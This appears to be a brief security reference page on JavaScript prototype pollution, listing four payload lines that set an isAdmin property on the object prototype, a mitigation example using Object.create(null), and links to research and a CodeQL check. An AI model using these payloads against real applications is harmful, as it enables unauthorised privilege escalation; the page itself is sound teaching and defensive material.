---
title: "Prototype Pollution"
description: "Overview of Prototype Pollution"
lead: "Overview of Prototype Pollution"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "javascript"
weight: 620
toc: true
---

## Payloads

```js
obj.__proto__.isAdmin = true;
obj["__proto__"]["isAdmin"] = true;

obj.constructor.prototype.isAdmin = true;
obj["constructor"]["prototype"]["isAdmin"] = true;
```

## Mitigation

```js
({}).isAdmin
=> true

Object.create(null).isAdmin
=> undefined
```

## Resources

- [Server-side prototype pollution: Black-box detection without the DoS](https://portswigger.net/research/server-side-prototype-pollution)
- [Server side prototype pollution, how to detect and exploit](https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/)
- [Research on Prototype Pollution](https://blog.s1r1us.ninja/research/PP)
- [CodeQL Prototype-polluting function](https://codeql.github.com/codeql-query-help/javascript/js-prototype-pollution-utility/)

